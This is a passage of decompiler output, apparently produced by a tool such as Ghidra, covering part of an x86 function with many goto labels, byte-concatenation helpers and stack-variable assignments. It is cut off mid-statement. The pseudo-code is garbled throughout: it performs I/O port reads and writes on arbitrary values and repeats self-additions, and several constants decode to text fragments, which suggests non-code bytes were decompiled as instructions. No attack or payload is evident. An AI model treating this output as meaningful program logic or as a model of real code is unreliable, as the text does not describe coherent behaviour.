if (*0x10 == 0xffffff96) goto code_r0x00466920;\ncode_r0x004668bc:\n                            *(puVar37 + 0x13) = *(puVar37 + 0x13) & ppcVar26;\n                            in_stack_00000065 = iVar6 + 0x69;\n                            *(puVar43 + 0x49) = *(puVar43 + 0x49) & puVar43;\n                            puVar49 = puVar49 + 1;\n                            ppcVar26 = ppcVar26 + -1;\n                            in_stack_00000067 = &stack0x00000069 >> 0x10;\n                            in_stack_00000068 = &stack0x00000069 >> 0x18;\n                            in_stack_00000064 = in_stack_0000002d >> 0x18;\n                            *(puVar43 + 0x45) = *(puVar43 + 0x45) & puVar43;\n                            in_stack_0000005c = in_stack_0000002d << 8;\n                            in_stack_00000060 = CONCAT31(in_stack_0000002d, in_stack_00000064);\n                            goto code_r0x004668cc;\n                        }\n                        puVar1 = iVar24 + 0x66;\n                        *puVar1 = *puVar1 + uVar15 * ((puVar28 & 3) - (*puVar1 & 3));\n                        if (uVar15) {\n                            *(puVar49 + ppcVar26) = *(puVar49 + ppcVar26) + (puVar37 >> 8);\n                            *(puVar49 + ppcVar26) = *(puVar49 + ppcVar26) + puVar28;\n                            *(ppcVar26 + -0x79) = *(ppcVar26 + -0x79) + puVar43;\n                            ppcVar26 = ppcVar26 & 0xffffff00 | ppcVar26 + (puVar28 >> 8);\n                        }\n                        else {\n                            puVar47 = puVar36 + 5;\n                            out(*puVar50, puVar43);\ncode_r0x004667e5:\n                            in_stack_0000002d = puVar28;\n                            if (uVar15) {\ncode_r0x00466846:\n                                ppcVar26 = ppcVar26 + 1;\n                                in_stack_00000035 = puVar37;\n                                in_stack_00000031 = puVar43;\n                                if (!uVar15) {\n                                    *(puVar37 + 0x13) = *(puVar37 + 0x13) & ppcVar26;\n                                    uVar15 = uVar16;\n                                    goto code_r0x004668bc;\n                                }\n                            }\n                            else {\n                                puVar38 = puVar37 + 0x1d;\n                                *puVar38 = *puVar38 + uVar15 * ((iVar6 + 0x6aU & 3) - (*puVar38 & 3));\n                                puVar31 = segment(in_GS, puVar47);\n                                puVar47 = puVar47 & 0xffff0000 | puVar47 + 4;\n                                out(*puVar31, puVar43);\n                                ppcVar27 = ppcVar26;\n                                in_stack_00000035 = puVar37;\n                                in_stack_00000031 = puVar43;\n                                puVar38 = puVar47;\n                                if (!uVar15) goto code_r0x004667ef;\n                            }\n                        }\ncode_r0x00466849:\n                        uVar15 = uVar16;\n                        puVar38 = puVar49;\n                        pcVar21 = ppcVar26 + 2;\n                        cVar14 = pcVar21;\n                        *pcVar21 = *pcVar21 + cVar14;\n                        *pcVar21 = *pcVar21 + cVar14;\n                        uVar17 = cVar14 + -0x79 + (in_stack_0000002d >> 8);\n                        puVar29 = (pcVar21 & 0xffffff00 | uVar17) * 2 + 0x2c;\n                        uVar16 = *puVar29;\n                        *puVar29 = uVar17;\n                        uVar51 = pcVar21 & 0xffffff00 | uVar16;\n                        puVar49 = uVar51 * 2 + 0x1c;\n                        uVar19 = *puVar49;\n                        *puVar49 = uVar51;\n                        puVar49 = uVar19 * 2 + 0x50;\n                        uVar51 = *puVar49;\n                        *puVar49 = uVar19;\n                        puVar49 = uVar51 * 2 + -8;\n                        uVar19 = *puVar49;\n                        *puVar49 = uVar51;\n                        puVar29 = uVar19 * 2 + 0x44;\n                        uVar16 = *puVar29;\n                        *puVar29 = uVar19;\n                        uVar19 = uVar19 & 0xffffff00 | uVar16;\n                        puVar49 = uVar19 * 2 + 1;\n                        in_stack_00000039 = *puVar49;\n                        *puVar49 = uVar19;\n                        *in_stack_00000039 = *in_stack_00000039 + in_stack_00000039;\n                        *in_stack_00000031 = *in_stack_00000031 + in_stack_00000035;\n                        *in_stack_00000039 = *in_stack_00000039 + in_stack_00000039;\ncode_r0x00466873:\n                        uVar18 = in_stack_00000039;\n                        *in_stack_00000039 = *in_stack_00000039 + uVar18;\n                        *in_stack_00000039 = *in_stack_00000039 + uVar18;\n                        puVar29 = in_stack_0000002d + 0x6f;\n                        uVar16 = *puVar29;\n                        uVar17 = *puVar29;\n                        *puVar29 = *puVar29 + uVar18;\n                        if (SCARRY1(uVar17, uVar18)) {\n                            *(in_stack_00000035 + -0x16) = 0;\n                            ppcVar26 = in_stack_00000039;\n                        }\n                        else {\n                            if (!CARRY1(uVar16, uVar18)) {\n                                puVar31 = segment(in_SS, iVar6 + 0x67);\n                                *puVar31 = 0x63282074;\n                                uVar16 = uVar15;\n                                goto code_r0x00466884;\n                            }\n                            out(*puVar47, in_stack_00000031);\n                            ppcVar26 = in_stack_00000039 + 2;\n                            *ppcVar26 = *ppcVar26 + ppcVar26;\n                            *ppcVar26 = *ppcVar26 + ppcVar26;\n                            *(in_stack_00000035 + 0x39) = *(in_stack_00000035 + 0x39) + (in_stack_00000031 >> 8);\n                        }\n                    }\n                    else {\ncode_r0x00466775:\n                        puVar38 = puVar49 + 1;\n                        out(*puVar49, puVar43);\n                        ppcVar27 = ppcVar26 + 1;\n                        puVar49 = puVar47;\n                        if (uVar15) {\n                            ppcVar26 = ppcVar26 + 3;\n                            uVar13 = cStack1;\ncode_r0x0046677e:\n                            cStack1 = uVar13;\n                            *ppcVar26 = *ppcVar26 + ppcVar26;\n                            in_stack_00000058 = in_stack_0000009d;\n                            puVar49 = puVar38;\ncode_r0x00466780:\n                            *ppcVar26 = *ppcVar26 + ppcVar26;\n                            *ppcVar26 = *ppcVar26 + ppcVar26;\n                            uVar17 = ppcVar26 + 0x73;\n                            pcVar21 = ppcVar26 & 0xffffff00 | uVar17;\n                            *pcVar21 = *pcVar21 + uVar17;\n                            *pcVar21 = *pcVar21 + uVar17;\n                            *puVar49 = *puVar49 + (puVar37 >> 8);\n                            uVar15 = 9 < (uVar17 & 0xf) | uVar16;\n                            ppcVar26 = ppcVar26 & 0xffff0000 |\n                                       CONCAT11(((ppcVar26 & 0xffffff00) >> 8) - uVar15, uVar17 + uVar15 * -6) & 0xff0f;\n                            puVar37 = puVar37 + 1;\n                            in_stack_0000009d = in_stack_00000058;\n                            uVar16 = uVar15;\n                            goto code_r0x0046678f;\n                        }\ncode_r0x004667ef:\n                        in_stack_00000031 = puVar43;\n                        in_stack_00000035 = puVar37;\n                        ppcVar26 = ppcVar27 + 1;\n                        if (!uVar15) {\n                            *(puVar49 + ppcVar27 + 0x12) = *(puVar49 + ppcVar27 + 0x12) + ppcVar26;\n                            *in_stack_00000035 = *in_stack_00000035 + ppcVar26;\n                            in_stack_0000002d = puVar28;\n                            puVar47 = puVar38;\n                            goto code_r0x00466849;\n                        }\n                        pcVar22 = ppcVar27 + 3;\n                        uVar17 = pcVar22;\n                        *pcVar22 = *pcVar22 + uVar17;\n                        pcVar21 = in_stack_00000035 * 4 + 0x44;\n                        *pcVar21 = *pcVar21 + (in_stack_00000035 >> 8);\n                        *pcVar22 = *pcVar22 + uVar17;\n                        uVar15 = 9 < (uVar17 & 0xf) | uVar16;\n                        uVar44 = CONCAT11((pcVar22 >> 8) - uVar15, uVar17 + uVar15 * -6) & 0xff0f;\n                        in_stack_00000039 = pcVar22 & 0xffff0000 | uVar44;\n                        in_stack_00000067 = SUB41(puVar38, 0);\n                        in_stack_00000068 = puVar38 >> 8;\n                        in_stack_00000069 = puVar38 >> 0x10;\n                        in_stack_0000006a = puVar38 >> 0x18;\n                        out(*puVar38, in_stack_00000031);\n                        uVar16 = uVar15;\n                        if (uVar15) {\n                            if (uVar15) {\n                                uVar16 = uVar44 | *in_stack_00000039;\n                                in_stack_00000039 = pcVar22 & 0xffff0000 | uVar44 & 0xffffff00 | uVar16;\n                                *in_stack_00000039 = *in_stack_00000039 + uVar16;\n                                *in_stack_00000039 = *in_stack_00000039 + uVar16;\n                                *in_stack_00000039 = *in_stack_00000039 + uVar16;\n                                in_stack_0000002d = puVar28 + 1;\n                                puVar47 = puVar38 + 2;\n                                out(puVar38[1], in_stack_00000031);\n                                goto code_r0x00466873;\n                            }\n                            puVar31 = CONCAT13(in_stack_00000072, \n                                               CONCAT12(in_stack_00000071, \n                                                        CONCAT11(in_stack_00000070, in_stack_0000006f)));\n                            in_stack_00000025 =\n                                 CONCAT13(in_stack_00000076, \n                                          CONCAT12(in_stack_00000075, CONCAT11(in_stack_00000074, in_stack_00000073)));\n                            in_stack_0000002d =\n                                 CONCAT22(in_stack_0000007d, CONCAT11(in_stack_0000007c, in_stack_0000007b));\n                            uVar42 = CONCAT11(in_stack_00000080, in_stack_0000007f);\n                            in_stack_00000031 = CONCAT22(in_stack_00000081, uVar42);\n                            in_stack_00000035 =\n                                 CONCAT22(in_stack_00000085, CONCAT11(in_stack_00000084, in_stack_00000083));\n                            in_stack_00000039 =\n                                 CONCAT13(in_stack_0000008a, \n                                          CONCAT12(in_stack_00000089, CONCAT11(in_stack_00000088, in_stack_00000087)));\n                            uVar20 = in(uVar42);\n                            *CONCAT13(in_stack_0000006e, \n                                      CONCAT12(in_stack_0000006d, CONCAT11(in_stack_0000006c, in_stack_0000006b))) =\n                                 uVar20;\n                            puVar38 = CONCAT13(in_stack_0000008e, \n                                               CONCAT12(in_stack_0000008d, \n                                                        CONCAT11(in_stack_0000008c, in_stack_0000008b)));\n                            if (!uVar15) {\n                                puVar47 = puVar31 + 1;\n                                out(*puVar31, uVar42);\n                                if (!uVar15) {\n                                    puVar38 = in_stack_00000035 + 0x1d;\n                                    *puVar38 = *puVar38 + uVar15 * ((iVar6 + 0x3dU & 3) - (*puVar38 & 3));\n                                    puVar31 = segment(in_GS, puVar47);\n                                    puVar50 = puVar47 & 0xffff0000 | puVar47 + 4;\n                                    out(*puVar31, uVar42);\n                                    goto code_r0x0046681a;\n                                }\n                                goto code_r0x00466873;\n                            }\n                            *in_stack_00000035 =\n                                 *in_stack_00000035 + uVar15 * ((in_stack_00000073 & 3) - (*in_stack_00000035 & 3));\n                            *in_stack_00000035 = *in_stack_00000035 & in_stack_00000080;\n                        }\n                        else {\ncode_r0x00466884:\n                            uVar15 = uVar16;\n                            *in_stack_00000039 = *in_stack_00000039 + -&stack0x0000003d;\n                            *in_stack_00000035 = *in_stack_00000035 ^ puVar38;\n                            in_stack_00000039 = in_stack_00000039 + -0x34303032;\n                        }\n                        *(in_stack_00000031 + 0x79) = *(in_stack_00000031 + 0x79) & in_stack_00000039 >> 8;\n                        *(in_stack_00000039 + 0x2e) = *(in_stack_00000039 + 0x2e) & in_stack_00000031;\n                        ppcVar26 = in_stack_00000039;\n                        uVar16 = uVar15;\ncode_r0x00466895:\n                        cVar14 = in_stack_00000031;\ncode_r0x00466896:\n                        ppcVar26 = ppcVar26 + 0x1b;\n                        uVar15 = 0;\n                        *ppcVar26 = *ppcVar26 & cVar14 - 1U;\n                        bVar54 = *ppcVar26 == '\\0';\n                        in_stack_0000002d = CONCAT13(in_stack_00000050, Stack0000004d);\n                        puVar43 = CONCAT13(in_stack_00000054, \n                                           CONCAT12(in_stack_00000053, CONCAT11(in_stack_00000052, in_stack_00000051)));\n                        in_stack_00000035 = CONCAT13(uStack00000058, CONCAT12(in_stack_00000057, in_stack_00000055));\n                        ppcVar26 = CONCAT13(uStack0000005c, Stack00000059);\n                        in_stack_0000009d = in_stack_00000045;\n                        puVar47 = in_stack_00000041;\n                        puVar49 = in_stack_0000003d;\ncode_r0x0046689b:\n                        puVar37 = in_stack_00000035;\n                        if (bVar54) goto code_r0x0046689d;\n                        *ppcVar26 = *ppcVar26 + ppcVar26;\n                        *ppcVar26 = *ppcVar26 + ppcVar26;\n                    }\n                }\n                else {\n                    puVar50 = puVar31 + 5;\n                    out(*puVar38, 0);\n                    if (puVar36 == NULL) {\n                        pcVar22 = pcVar22 + 1;\ncode_r0x00466335:\n                        pcVar22 = pcVar22 + 2;\n                        cVar14 = pcVar22;\n                        *pcVar22 = *pcVar22 + cVar14;\n                        *pcVar22 = *pcVar22 + cVar14;\n                        pcVar22 = pcVar22 & 0xffffff00 | cVar14 + 0x73;\n                        puVar48 = puVar50;\n                        goto code_r0x0046633f;\n                    }\n                    uVar19 = in(0);\n                    *puVar49 = uVar19;\n                    puVar48 = puVar50;\n                    if (in_AF) goto code_r0x00466345;\n                    puVar48 = puVar31 + 9;\n                    out(*puVar50, 0);\n                    if (in_AF) {\n                        if (puVar36 == NULL) {\ncode_r0x0046637c:\n                            in_AF = 9 < (pcVar22 & 0xf) | in_AF;\n                            puVar49 = CONCAT13(var_8h, CONCAT12(uStack13, CONCAT11(uStack14, uStack15)));\n                            puVar47 = CONCAT13(var_4h, CONCAT12(var_8h._3_1_, var_8h._1_2_));\n                            puVar28 = CONCAT13(unaff_retaddr, CONCAT12(cStack1, CONCAT11(uStack2, uStack3)));\n                            puVar43 = CONCAT13(arg_8h, CONCAT12(unaff_retaddr_01, unaff_retaddr_00));\n                            puVar36 = CONCAT13(in_stack_00000008, arg_8h >> 8);\n                            *puVar49 = *puVar49 + arg_8h._2_1_;\n                            in_AF = 9 < (in_stack_00000009 & 0xf) | 9 < (pcVar22 + in_AF * -6 & 0xf) | in_AF;\n                            pcVar22 = CONCAT22(in_stack_0000000b, \n                                               CONCAT11(in_stack_0000000a - in_AF, in_stack_00000009 + in_AF * -6)) &\n                                      0xffffff0f;\n                            puVar38 = puVar48;\n                            goto code_r0x004663f2;\n                        }\n                        pcVar22 = pcVar22 + 1;\ncode_r0x00466317:\n                        pcVar22 = pcVar22 + 2;\n                        *pcVar22 = *pcVar22 + pcVar22;\n                        uVar16 = pcVar22 + 0x73;\n                        pcVar21 = pcVar22 & 0xffffff00 | uVar16;\n                        *pcVar21 = *pcVar21 + uVar16;\n                        *pcVar21 = *pcVar21 + uVar16;\n                        *puVar48 = *puVar48 + (puVar36 >> 8);\n                        in_AF = 9 < (uVar16 & 0xf) | in_AF;\n                        uVar19 = pcVar22 & 0xffff0000 |\n                                 CONCAT11(((pcVar22 & 0xffffff00) >> 8) - in_AF, uVar16 + in_AF * -6) & 0xff0f;\n                        puVar37 = puVar36 + 1;\n                        puVar1 = puVar36 + puVar38 * 2 + 0x71;\n                        *puVar1 = *puVar1 + in_AF * ((puVar48 & 3) - (*puVar1 & 3));\n                        pcVar22 = uVar19 + 1;\n                        puVar36 = puVar37;\n                        puVar50 = puVar48;\n                        puVar49 = puVar47;\n                        if (in_AF) goto code_r0x00466335;\n                        if (pcVar22 != NULL) {\n                            iVar24 = uVar19 + 2;\ncode_r0x004663aa:\n                            pcVar22 = iVar24 + 2;\n                            uVar16 = pcVar22;\n                            *pcVar22 = *pcVar22 + uVar16;\n                            pcVar21 = puVar37 * 4 + 0x44;\n                            *pcVar21 = *pcVar21 + (puVar37 >> 8);\n                            *pcVar22 = *pcVar22 + uVar16;\n                            in_AF = 9 < (uVar16 & 0xf) | in_AF;\n                            in_stack_00000067 = SUB41(puVar48, 0);\n                            in_AF = 9 < (uVar16 + in_AF * -6 & 0xf) | in_AF;\n                            puVar48 = CONCAT13(in_stack_0000006e, \n                                               CONCAT12(in_stack_0000006d, \n                                                        CONCAT11(in_stack_0000006c, in_stack_0000006b)));\n                            puVar47 = CONCAT11(in_stack_00000072, in_stack_00000071) << 0x10;\n                            puVar37 = CONCAT22(in_stack_00000081, CONCAT11(in_stack_00000080, in_stack_0000007f));\n                            pcVar21 = CONCAT22(in_stack_00000085, CONCAT11(in_stack_00000084, in_stack_00000083));\n                            goto code_r0x0046642b;\n                        }\n                        in_stack_0000007b = SUB41(puVar48, 0);\n                        in_stack_0000007c = puVar48 >> 8;\n                        in_stack_0000007d = puVar48 >> 0x10;\n                        if (!in_AF) {\ncode_r0x0046648b:\n                            *puVar48 = *puVar48 + (puVar37 >> 8);\n                            in_AF = 9 < (pcVar22 & 0xf) | in_AF;\n                            pcVar22 = pcVar22 & 0xffff0000 |\n                                      CONCAT11((pcVar22 >> 8) - in_AF, pcVar22 + in_AF * -6) & 0xff0f;\n                            puVar49 = puVar48;\n                            goto code_r0x0046648c;\n                        }\n                        if (!in_AF) {\n    // WARNING: Ignoring partial resolution of indirect\n                            goto code_r0x00466480;\n                        }\n                        uVar51 = in(puVar43);\n                        *puVar47 = uVar51;\n                        puVar49 = puVar48;\n                        if (in_AF) goto code_r0x0046648c;\n                        puVar49 = puVar48 + 1;\n                        out(*puVar48, puVar43);\n                        if (in_AF) {\n                            if (pcVar22 != NULL) goto code_r0x0046645f;\n                            puVar38 = CONCAT13(in_stack_00000009, CONCAT12(in_stack_00000008, arg_8h >> 0x10));\n                            uVar51 = *(puVar47 + 0x62) * 0x6675;\n                            uVar19 = uVar19 + 2;\n                            puVar1 = puVar38 + 0x66;\n                            *puVar1 = *puVar1 + (uVar51 != uVar51) * ((puVar28 & 3) - (*puVar1 & 3));\n                            in_stack_0000009d = *((puVar47 & 0xffff0000 | uVar51 & 0xffff) + 0x62) * 0x44406675;\n                            arg_8h._3_1_ = SUB41(in_stack_0000009d, 0);\n                            in_stack_00000008 = in_stack_0000009d >> 8;\n                            in_stack_00000009 = in_stack_0000009d >> 0x10;\n                            in_stack_0000000a = in_stack_0000009d >> 0x18;\n                            uVar16 = 9 < (uVar19 & 0xf) | in_AF;\n                            unaff_retaddr_01 = 0x61;\n                            arg_8h._0_1_ = 0x72;\n                            arg_8h._1_1_ = 0x5f;\n                            arg_8h._2_1_ = 't';\n                            iVar8 = *(puVar28 + puVar49 * 2 + 0x40) * 0x74734044;\n                            puVar48 = iVar8;\n                            bVar54 = puVar48 != iVar8;\n                            pcVar22 = (uVar19 & 0xffff0000 |\n                                      (CONCAT11((uVar19 >> 8) - uVar16, uVar19 + uVar16 * -6) & 0xff0f) & 0xffffff63) +\n                                      3;\n                            goto code_r0x004664f4;\n                        }\n                        puVar48 = puVar49;\n                        uVar16 = in_AF;\n                        if (in_AF) goto code_r0x0046641f;\n                        goto code_r0x00466493;\n                    }\n                    if (!in_AF) goto code_r0x00466345;\n                    pcVar22 = pcVar22 + 2;\n                    pcVar3 = puVar36 * 4 + 0x44;\n                    *pcVar3 = *pcVar3 + (puVar36 >> 8);\n                    *pcVar22 = *pcVar22 + pcVar22;\n                    in_AF = 9 < (pcVar22 & 0xf) | in_AF;\n                    puVar25 = puVar38 & 0xffff0000 | puVar48 & 0xffff;\n                    puVar31 = puVar48 & 0xffff0000 | puVar48 >> 0x10;\n                    puVar47 = puVar47 & 0xffff0000 | CONCAT11(uStack14, uStack15);\n                    puVar28 = puVar28 & 0xff0000 | var_8h._1_2_;\n                    uVar44 = CONCAT11(var_4h, var_8h._3_1_);\n                    puVar43 = uVar44 | 0x60000000;\n                    puVar36 = pcVar21 + 2 & 0xffff0000 | CONCAT11(var_4h._2_1_, var_4h._1_1_);\n                    uVar19 = pcVar22 & 0xffff0000 | CONCAT11(uStack4, var_4h._3_1_);\n                    puVar38 = puVar47 + 0x1d;\n                    *puVar38 = *puVar38 + in_AF * ((iVar6 - 3U & 3) - (*puVar38 & 3));\n                    puVar38 = puVar25 + 1;\n                    uVar5 = in(uVar44);\n                    *puVar25 = uVar5;\n                    puVar48 = puVar31 + 1;\n                    out(*puVar31, uVar44);\n                    puVar49 = puVar36 + 0x1b;\n                    *puVar49 = *puVar49 + in_AF * ((iVar6 - 3U & 3) - (*puVar49 & 3));\n                    cVar14 = CONCAT11(var_4h._2_1_, var_4h._1_1_) >> 8;\n                    if (!in_AF) {\n                        iVar24 = uVar19 + 3;\n                        if (in_AF) {\n                            pcVar22 = uVar19 + 5;\n                            pcVar21 = puVar36 * 4 + 0x44;\n                            *pcVar21 = *pcVar21 + cVar14;\n                            *pcVar22 = *pcVar22 + pcVar22;\n                            goto code_r0x0046637c;\n                        }\n                        goto code_r0x004663e4;\n                    }\n                    pcVar21 = uVar19 + 4;\n                    *pcVar21 = *pcVar21 + pcVar21;\n                    uVar16 = pcVar21 + 0x73;\n                    pcVar22 = pcVar21 & 0xffffff00 | uVar16;\n                    *pcVar22 = *pcVar22 + uVar16;\n                    *pcVar22 = *pcVar22 + uVar16;\n                    *puVar48 = *puVar48 + cVar14;\n                    in_AF = 9 < (uVar16 & 0xf) | in_AF;\n                    puVar36 = puVar36 + 1;\n                    var_4h._2_1_ = SUB41(puVar48, 0);\n                    var_4h._3_1_ = puVar48 >> 8;\n                    uStack4 = puVar48 >> 0x10;\n                    uStack3 = puVar48 >> 0x18;\n                    puVar1 = puVar25 + 0x65;\n                    *puVar1 = *puVar1 + in_AF * ((uStack15 & 3) - (*puVar1 & 3));\n                    puVar1 = puVar31 + in_GS_OFFSET + 0x78;\n                    *puVar1 = *puVar1 + in_AF * ((puVar48 & 3) - (*puVar1 & 3));\n                    pcVar22 = (pcVar21 & 0xffff0000 |\n                              CONCAT11(((pcVar21 & 0xffffff00) >> 8) - in_AF, uVar16 + in_AF * -6) & 0xff0f) + 1;\n                    puVar38 = puVar48;\n                    if (in_AF) goto code_r0x00466317;\n                    puVar49 = puVar48;\n                    if (in_AF) goto code_r0x004663f2;\n                    puVar47 = CONCAT22(in_stack_00000017, in_stack_00000015);\n                    uVar20 = in(iVar41);\n                    *CONCAT22(in_stack_0000000f, CONCAT11(in_stack_0000000e, in_stack_0000000d)) = uVar20;\n                    uVar19 = in_stack_00000029 + 1;\n                    uStack0000002d = in_stack_00000017 >> 8;\n                    in_stack_0000002d = in_stack_0000002d & 0xffffff00 | uStack0000002d;\n                    in_AF = 9 < (uVar19 & 0xf) | in_AF;\n                    uVar19 = uVar19 & 0xffff0000 |\n                             (CONCAT11((uVar19 >> 8) - in_AF, uVar19 + in_AF * -6) & 0xff0f) & 0xffffff63;\n                    in_stack_0000006b = 0x61;\n                    in_stack_0000006c = 0x72;\n                    in_stack_0000006d = '_';\n                    in_stack_0000006e = 0x74;\n                    iVar8 = *(CONCAT22(in_stack_0000001f, in_stack_0000001d) + 0x40 +\n                             CONCAT22(in_stack_00000013, in_stack_00000011) * 2) * 0x74734044;\n                    puVar48 = iVar8;\n                    iVar24 = uVar19 + 3;\n                    puVar37 = in_stack_00000025;\n                    if (puVar48 != iVar8) goto code_r0x004663aa;\n                    if (iVar24 == 0) {\n                        pcVar22 = 0x73;\n                        *0x73 = *0x73 + -0x1a;\n                        puVar43 = in_stack_00000021;\n                        goto code_r0x0046648b;\n                    }\n                    pcVar22 = uVar19 + 4;\ncode_r0x0046641f:\n                    pcVar22 = pcVar22 + 2;\n                    *pcVar22 = *pcVar22 + pcVar22;\n                    uVar16 = pcVar22 + 0x73;\n                    pcVar21 = pcVar22 & 0xffffff00 | uVar16;\n                    *pcVar21 = *pcVar21 + uVar16;\n                    *pcVar21 = *pcVar21 + uVar16;\ncode_r0x0046642b:\n                    *puVar48 = *puVar48 + (puVar37 >> 8);\n                    uVar16 = 9 < (pcVar21 & 0xf) | in_AF;\n                    in_stack_00000068 = SUB41(puVar48, 0);\n                    in_stack_00000069 = puVar48 >> 8;\n                    in_stack_0000006a = puVar48 >> 0x10;\n                    in_stack_0000006b = puVar48 >> 0x18;\n                    uVar19 = puVar48 & 0xffff0000;\n                    puVar48 = uVar19 | puVar48 >> 0x10;\n                    puVar38 = puVar37 + 1 & 0xffff0000 | CONCAT11(in_stack_00000075, in_stack_00000074);\n                    pcVar22 = pcVar21 & 0xffff0000 | CONCAT11(in_stack_00000077, in_stack_00000076);\n                    iVar8 = *((puVar47 & 0xffff0000 | CONCAT11(in_stack_0000006d, in_stack_0000006c)) + 0x72 +\n                             puVar48 * 2) * 0x6f694065;\n                    in_AF = iVar8 != iVar8;\n                    puVar37 = puVar38;\n                    if (!in_AF) goto code_r0x0046649b;\n                    pcVar21 = pcVar22 + 1;\n                    bVar54 = pcVar21 == NULL;\n                    if (!in_AF) goto code_r0x004664b7;\n                    pcVar22 = pcVar22 + 3;\n                    *pcVar22 = *pcVar22 + pcVar22;\n                    uVar15 = pcVar22 + 0x73;\n                    pcVar21 = pcVar22 & 0xffffff00 | uVar15;\n                    *pcVar21 = *pcVar21 + uVar15;\n                    *pcVar21 = *pcVar21 + uVar15;\n                    *puVar48 = *puVar48 + (CONCAT11(in_stack_00000075, in_stack_00000074) >> 8);\n                    uVar16 = 9 < (uVar15 & 0xf) | uVar16;\n                    in_stack_00000077 = uVar19 >> 0x10;\n                    in_stack_00000078 = uVar19 >> 0x18;\n                    uVar16 = 9 < (uVar15 + uVar16 * -6 & 0xf) | uVar16;\n                    puVar48 = CONCAT13(in_stack_0000007c, CONCAT12(in_stack_0000007b, in_stack_00000079));\n                    in_stack_00000075 = in_stack_0000006a;\n                    in_stack_00000076 = in_stack_0000006b;\n                    cVar14 = in_stack_0000008e;\ncode_r0x004664c3:\n                    uVar15 = in_stack_00000091;\n                    *in_stack_00000091 = *in_stack_00000091 + uVar15;\n                    *in_stack_00000091 = *in_stack_00000091 + uVar15;\n                    *puVar48 = *puVar48 + cVar14;\n                    uVar16 = 9 < (uVar15 & 0xf) | uVar16;\n                    uVar16 = 9 < (uVar15 + uVar16 * -6 & 0xf) | uVar16;\n                    puVar37 = in_stack_000000a9;\n                    in_stack_0000004c = in_stack_00000095;\n                    in_stack_00000091 = puVar48;\ncode_r0x0046653b:\n                    uVar15 = in_stack_000000ad;\n                    *in_stack_000000ad = *in_stack_000000ad + uVar15;\n                    *in_stack_000000ad = *in_stack_000000ad + uVar15;\n                    *in_stack_0000004c = *in_stack_0000004c + (puVar37 >> 8);\n                    uVar16 = 9 < (uVar15 & 0xf) | uVar16;\n                    uVar16 = 9 < (uVar15 + uVar16 * -6 & 0xf) | uVar16;\n                    puVar48 = CONCAT13(in_stack_00000053, \n                                       CONCAT12(in_stack_00000052, CONCAT11(in_stack_00000051, in_stack_00000050)));\n                    cVar14 = in_stack_00000065;\n                    pcVar21 = CONCAT13(in_stack_0000006b, \n                                       CONCAT12(in_stack_0000006a, CONCAT11(in_stack_00000069, in_stack_00000068)));\ncode_r0x004665b3:\n                    uVar15 = pcVar21;\n                    *pcVar21 = *pcVar21 + uVar15;\n                    *pcVar21 = *pcVar21 + uVar15;\n                    *puVar48 = *puVar48 + cVar14;\n                    uVar16 = 9 < (uVar15 & 0xf) | uVar16;\n                    uVar15 = uVar15 + uVar16 * -6 & 0xf;\n                    in_stack_00000050 = puVar48;\n                    in_stack_00000051 = puVar48 >> 8;\n                    in_stack_00000052 = puVar48 >> 0x10;\n                    in_stack_00000053 = puVar48 >> 0x18;\n                    uVar16 = 9 < uVar15 | uVar16;\n                    bVar54 = (uVar15 + uVar16 * -6 & 2) != 0;\n                    puVar38 = CONCAT13(in_stack_00000057, CONCAT21(in_stack_00000055, in_stack_00000054));\n                    puVar43 = CONCAT13(in_stack_00000067, CONCAT21(in_stack_00000065, in_stack_00000064));\n                    puVar37 = CONCAT13(in_stack_0000006b, \n                                       CONCAT12(in_stack_0000006a, CONCAT11(in_stack_00000069, in_stack_00000068)));\n                    pcVar21 = CONCAT13(in_stack_0000006f, \n                                       CONCAT12(in_stack_0000006e, CONCAT11(in_stack_0000006d, in_stack_0000006c)));\n                    if (!bVar54) {\n                        uStack2 = in_stack_00000055;\n                        cStack1 = in_stack_00000055 >> 8;\n                        puVar28 = in_stack_00000060;\n                        in_stack_0000009d = in_stack_00000058;\n                        if (bVar54) {\n                            ppcVar26 = pcVar21 + 4;\n                            puVar49 = puVar38;\n                            cStack1 = uVar13;\n                            if (ppcVar26 != NULL) {\n                                pcVar21 = pcVar21 + 7;\n                                *pcVar21 = *pcVar21 + pcVar21;\n                                uVar15 = pcVar21 + 0x73;\n                                pcVar22 = pcVar21 & 0xffffff00 | uVar15;\n                                *pcVar22 = *pcVar22 + uVar15;\n                                *pcVar22 = *pcVar22 + uVar15;\n                                *puVar38 = *puVar38 + in_stack_00000069;\n                                uVar16 = 9 < (uVar15 & 0xf) | uVar16;\n                                pcVar21 = pcVar21 & 0xffff0000 |\n                                          CONCAT11(((pcVar21 & 0xffffff00) >> 8) - uVar16, uVar15 + uVar16 * -6) &\n                                          0xff0f;\n                                puVar37 = puVar37 + 1;\ncode_r0x0046672b:\n                                puVar47 = puVar48 + 1;\n                                uVar5 = in(puVar43);\n                                *puVar48 = uVar5;\n                                puVar49 = puVar38 + 1;\n                                out(*puVar38, puVar43);\n                                piVar32 = segment(in_SS, in_stack_0000009d + puVar47 + 0x5f);\n                                uVar15 = &stack0x0000006b != *piVar32 * 0x6f727265;\n                                if (!uVar15) {\n                                    if (!uVar15) goto code_r0x004667ae;\n                                    goto code_r0x0046673a;\n                                }\n                                ppcVar26 = pcVar21 + 1;\n                                cStack1 = uVar13;\n                                goto code_r0x00466775;\n                            }\n                            goto code_r0x00466780;\n                        }\n                        *pcVar21 = *pcVar21 + in_stack_0000006c;\n                        *puVar38 = *puVar38 + in_stack_00000069;\n                        uVar16 = 9 < (in_stack_0000006c & 0xf) | uVar16;\n                        pcVar22 = (pcVar21 & 0xffff0000 |\n                                  CONCAT11(in_stack_0000006d - uVar16, in_stack_0000006c + uVar16 * -6) & 0xff0f) + 2;\n                        pcVar21 = puVar37 * 4 + 0x44;\n                        *pcVar21 = *pcVar21 + in_stack_00000069;\n                        uVar15 = pcVar22;\n                        *pcVar22 = *pcVar22 + uVar15;\n                        uVar16 = 9 < (uVar15 & 0xf) | uVar16;\n                        uVar44 = CONCAT11((pcVar22 >> 8) - uVar16, uVar15 + uVar16 * -6) & 0xff0f;\n                        puVar37 = puVar37 + 1;\n                        in_stack_0000006e = in_stack_00000057;\n                        uVar15 = uVar44;\n                        uVar16 = 9 < uVar15 | uVar16;\n                        uVar15 = uVar15 + uVar16 * -6;\n                        ppcVar26 = pcVar22 & 0xffff0000 |\n                                   (CONCAT11((uVar44 >> 8) - uVar16, uVar15) & 0xff0f) & 0xffffff6e;\n                        in_stack_0000006c = uStack2;\n                        in_stack_0000006d = cStack1;\n                        if ((uVar15 & 0xe) != 0) goto code_r0x0046677e;\n                        puVar49 = puVar38 + 1;\n                        out(*puVar38, CONCAT21(in_stack_00000065, 